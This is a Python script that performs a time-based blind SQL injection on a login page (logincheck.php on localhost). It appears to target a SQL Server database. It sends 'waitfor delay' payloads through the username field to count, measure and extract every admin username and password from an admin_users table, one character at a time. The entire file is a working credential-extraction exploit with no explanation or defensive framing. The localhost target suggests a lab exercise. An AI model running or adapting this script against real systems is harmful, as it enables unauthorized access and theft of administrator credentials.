from tracemalloc import start
from urllib.parse import quote, urlencode
import requests
import time


def encode_url(s: str):
    uri = []
    byte_s = s.encode('utf-8')
    for e in byte_s:
        uri.append('%' + hex(e).replace('0x', '').zfill(2))
    return ''.join(uri)


base = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_/'
url = 'http://localhost/logincheck.php'

#猜测ADMIN_NAME个数
numbers = 0
for l in range(1, 20):
    payload = "1' if ((select count(admin_name) from admin_users)={}) waitfor delay '0:0:5'--".format(
        l)
    start_time = time.time()
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_NAME每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' if ((select top 1 len(admin_name) from admin_users where admin_name not in (select top {} admin_name from admin_users)) ={}) waitfor delay '0:0:5'--".format(
            i, l)
        start_time = time.time()
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_USER每项的值
user_name = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' if (ascii(substring((select top 1 admin_name from admin_users where admin_name not in (select top {} admin_name from admin_users)),{},1))={}) waitfor delay '0:0:5'--".format(
                i, l, ord(c))
            start_time = time.time()
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if time.time() - start_time > 3:
                name += c
                break
    user_name.append(name)
    print('admin_user: ', name)

#猜测ADMIN_PASSWORD个数
for l in range(1, 20):
    payload = "1' if ((select count(admin_password) from admin_users)={}) waitfor delay '0:0:5'--".format(
        l)
    start_time = time.time()
    res = requests.post(url,
                        data={
                            'username': encode_url(payload),
                            'password': '1234',
                            'formsubmit': '登录'
                        })
    if time.time() - start_time > 3:
        numbers = l
        print('numbers: ', l)
        break

# 猜测ADMIN_PASSWORD每项长度
len = []
for i in range(0, numbers):
    for l in range(1, 20):
        payload = "1' if ((select top 1 len(admin_password) from admin_users where admin_password not in (select top {} admin_password from admin_users)) ={}) waitfor delay '0:0:5'--".format(
            i, l)
        start_time = time.time()
        res = requests.post(url,
                            data={
                                'username': encode_url(payload),
                                'password': '1234',
                                'formsubmit': '登录'
                            })
        if time.time() - start_time > 3:
            len.append(l)
            print('length: ', l)
            break

#猜测ADMIN_PASSWORED每项的值
user_password = []
for i in range(0, numbers):
    name = ''
    for l in range(1, len[i] + 1):
        for c in base:
            payload = "1' if (ascii(substring((select top 1 admin_password from admin_users where admin_password not in (select top {} admin_password from admin_users)),{},1))={}) waitfor delay '0:0:5'--".format(
                i, l, ord(c))
            start_time = time.time()
            res = requests.post(url,
                                data={
                                    'username': encode_url(payload),
                                    'password': '1234',
                                    'formsubmit': '登录'
                                })
            if time.time() - start_time > 3:
                name += c
                break
    user_password.append(name)
    print('admin_password: ', name)
